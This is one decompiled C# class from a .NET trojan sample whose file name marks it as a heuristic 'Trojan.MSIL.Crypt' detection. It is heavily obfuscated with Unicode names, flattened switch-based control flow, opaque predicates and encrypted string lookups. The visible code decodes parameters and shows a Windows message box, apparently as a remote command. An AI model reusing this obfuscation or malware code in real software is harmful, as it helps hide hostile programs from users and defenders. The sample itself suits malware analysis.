// Decompiled with JetBrains decompiler
// Type: @ԏ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

internal sealed class \u0040ԏ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u0037X5() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u00319o() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ԏ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    \u0040ԏ.\u0040ӛ();
    int num1 = \u0040ԏ.\u0040Ӝ() ? 2 : 3;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 3:
          goto label_5;
        case 1:
        case 2:
          goto label_2;
        case 4:
          goto label_7;
        default:
          num1 = 4;
          continue;
      }
    }
label_2:
    \u0040ԏ.\u0040Ӗ((object) this);
    goto label_7;
label_5:
    \u0040ԏ.\u0040ӕ();
    goto label_2;
label_7:
    try
    {
      \u0040ԏ.\u0040ӓ ӓ = new \u0040ԏ.\u0040ӓ();
      ӓ.\u0040ӓ = _param2.\u0040ӗ<Dictionary<string, string>>();
      int num2 = !\u0040ԏ.\u0040ӛ() ? 7 : 10;
      string str1;
      string str2;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 10:
            ӓ.\u0040Ӕ = MessageBoxIcon.None;
            num2 = 2;
            continue;
          case 1:
            if (!\u0040ԏ.\u0040Ә((object) str1, \u0040ԏ.\u0040ӗ(4248)))
            {
              num2 = 11;
              continue;
            }
            ӓ.\u0040Ӕ = MessageBoxIcon.Question;
            num2 = 9;
            continue;
          case 2:
            str2 = ӓ.\u0040ӓ[(string) \u0040ԏ.\u0040ӗ(4192)];
            num2 = 14;
            continue;
          case 3:
          case 7:
            if (!\u0040ԏ.\u0040Ә((object) str1, \u0040ԏ.\u0040ӗ(4204)))
            {
              if (true)
              {
                num2 = 13;
                continue;
              }
              goto case 4;
            }
            else
            {
              ӓ.\u0040Ӕ = MessageBoxIcon.Asterisk;
              if (\u0040ԏ.\u0040ӛ())
              {
                num2 = 12;
                continue;
              }
              goto case 13;
            }
          case 4:
          case 5:
          case 8:
          case 9:
          case 12:
            \u0040ԏ.\u0040ә((object) new Thread(new ThreadStart(ӓ.\u0040ӕ)));
            if (!\u0040ԏ.\u0040Ӝ())
            {
              num2 = 6;
              continue;
            }
            goto case 3;
          case 6:
            this.\u0040Ӕ = 0;
            if (\u0040ԏ.\u0040ӛ())
            {
              num2 = 15;
              continue;
            }
            goto case 11;
          case 11:
            if (\u0040ԏ.\u0040Ә((object) str1, \u0040ԏ.\u0040ӗ(4276)))
            {
              ӓ.\u0040Ӕ = MessageBoxIcon.Hand;
              if (\u0040ԏ.\u0040ӛ())
              {
                num2 = 8;
                continue;
              }
              goto case 4;
            }
            else
              goto case 4;
          case 13:
            if (\u0040ԏ.\u0040Ә((object) str1, \u0040ԏ.\u0040ӗ(4230)))
            {
              ӓ.\u0040Ӕ = MessageBoxIcon.Exclamation;
              num2 = 5;
              continue;
            }
            num2 = 1;
            continue;
          case 14:
            str1 = str2;
            goto case 3;
          case 15:
            goto label_27;
          default:
            if (true)
            {
              num2 = 4;
              continue;
            }
            goto case 4;
        }
      }
label_27:;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040ԏ.\u0040Ӛ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ә(object _param0, object _param1) => (string) _param0 == (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ә(object _param0) => ((Thread) _param0).Start();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӛ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӝ() => false;

  private sealed class \u0040ӓ
  {
    public Dictionary<string, string> \u0040ӓ;
    public MessageBoxIcon \u0040Ӕ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040ӓ()
    {
      \u0040ԏ.\u0040ӓ.\u0040Ӗ();
      \u0040ԏ.\u0040ӓ.\u0040ӗ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӕ()
    {
      int num = (int) \u0040ԏ.\u0040ӓ.\u0040Ӝ(\u0040ԏ.\u0040ӓ.\u0040ӛ((object) this.\u0040ӓ[(string) \u0040ԏ.\u0040ӓ.\u0040Ӛ(4290)], \u0040ԏ.\u0040ӓ.\u0040Ӛ(2446)), \u0040ԏ.\u0040ӓ.\u0040ӛ((object) this.\u0040ӓ[(string) \u0040ԏ.\u0040ӓ.\u0040Ӛ(4302)], \u0040ԏ.\u0040ӓ.\u0040Ӛ(2446)), MessageBoxButtons.OK, this.\u0040Ӕ, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӗ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӗ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ә() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ә() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӛ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӛ(object _param0, object _param1) => (object) ((string) _param0 + (string) _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static DialogResult \u0040Ӝ(
      object _param0,
      object _param1,
      MessageBoxButtons _param2,
      MessageBoxIcon _param3,
      MessageBoxDefaultButton _param4,
      MessageBoxOptions _param5)
    {
      return MessageBox.Show((string) _param0, (string) _param1, _param2, _param3, _param4, _param5);
    }
  }
}
